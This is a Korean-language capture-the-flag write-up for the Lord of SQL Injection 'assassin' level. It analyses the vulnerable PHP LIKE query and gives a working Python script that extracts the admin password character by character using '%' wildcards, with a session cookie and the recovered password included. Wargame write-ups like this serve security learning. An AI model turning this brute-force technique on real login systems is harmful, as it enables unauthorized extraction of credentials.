# Lord of SQL Injection No.15 - assassin
## 문제 출제 의도
와일드 카드를 사용하여 원하는 값을 뽑아 올 수 있는지 확인한다.

## 소스 코드 분석
+ 소스 코드  
assassin의 소스 코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("assassin"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - PHP
        * <?php 로 시작하여 ?>로 끝나는 것을 보아 PHP코드 라는 것을 알 수 있다.
    - include
        * 외부 php 코드를 불러와 사용한다.  
        * 따라서 뒤에 정의 하지 않은 함수 가 있다면 이는 외부 php 코드에서 온 것이라 추측 할 수 있다.
        ~~~
        login_chk();
        dbconnect();
        ~~~
        * 위 함수는 정의 한적 없는 함수이기에 외부 php 파일인 config.php에 정의된 함수라 추측 가능하다.
        * login_chk();는 로그인 여부를 확인 하는 함수라 추측 가능하다.
        * dbconnect();는 데이터베이스에 연결하는 함수라 추측이 가능하다.

    - preg_match()함수
        * preg_match 함수는 다음과 같은 형식을 취한다.
        ~~~
        preg_match("/탐색할 문자열/옵션,대상 문자열")
        ~~~
        1. 옵션 i = 대소문자를 구별하지 않는다.
        2. 옵션 g = 문자열을 끝까지 비교한다.
        3. 리턴 값으로 0, 1, FALSE를 갖는다. 이 함수는 매칭된 횟수를 리턴하는데 1번만 매칭시키기 때문에 0 또는 1이라는 값을 갖고, 오류가 날 경우에는 FALSE를 반환한다.
        * 따라서 GET방식으로 입력받은 pw값에 singel quote즉 단 따옴표가 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.

    - Query
        * prob_assassin이라는 데이터 베이스 테이블에서 id값을 뽑아온다. 단 그 레코드의 pw가 사용자가 입력한 pw와 일치하는 id 값만 가져온다.

    - mysql_fetch_array()함수
        ~~~
        array mysql_fetch_array ( resource $result [, int $result_type ] )
        ~~~
        * mysql_fetch_array함수는다음과 같은 형식을 취한다.
            1. result = mysql_query() 호출을 통한 결과
            2. result type = 인출될 배열의 형태를 결정하는 인자로 다음과 같은 상수가 올 수 있다 : MYSQL_ASSOC, MYSQL_NUM, MYSQL_BOTH이며 기본값은 MYSQL_BOTH이다.

        * 반환값 
            1. MYSQL_BOTH는 연관 색인과 숫자형 색인 모두 반환할 것이다. 
            2. MYSQL_ASSOC를 사용하면, mysql_fetch_assoc()처럼 연관된 인덱스 배열로 반환한다.
            3. MYSQL_NUM를 사용하면, mysql_fetch_row()처럼 숫자형 인덱스 배열로 반환한다.

    - 문제 풀이에 성공하는 조건
        * query를 통해 받아온 id 값에 0이 아닌 값이 들어있으면 "Hello + 'id'"가 출력된다.
        * query를 통해 받아온 id 값이 'admin'이면 문제풀이에 성공한다.

## 문제 해결
+ SQL injection
    - single quote 를 금지하고 pw 양쪽을 single quote 로 묶어 Injection 공격이 불가능하다
    - 따라서 Blind Sql 을 이용하여 비밀번호를 알아내야 한다.
+ 와일드 카드
    1. % =  ~%로 사용하면 ~까지 일치하는 문자열은 모두 해당된다. 즉 ~값만 같으면 %이후의 값은 중요하지 않다.
    2. _ = 해당하는 글자만큼의 와일드카드이다. "_"를 사용한 만큼의 문자만 적용된다.
+ 소스코드
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    for i in range(1, 9):
        buf=chr(0)
        for j in range(48, 91):
            url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
            data = "{}%".format(key+chr(j))
            print(data)
            # data = quote(data)

            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=3q0e1uadocute8g1nvp6u7l6k1")
            res = urllib.request.urlopen(re)
            result=str(res.read())

            if  result.find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                buf=str(1)
                break

            elif result.find("Hello guest") != -1:
                buf=chr(j).lower()

        if buf != str(1):
            key += buf
    print(key)
    ~~~
    - 따라서 다음과 같은 코드를 사용하면 pw=832edd10이된다.
    - 이를 GET방식으로 pw 에 입력하면 문제가 해결된다.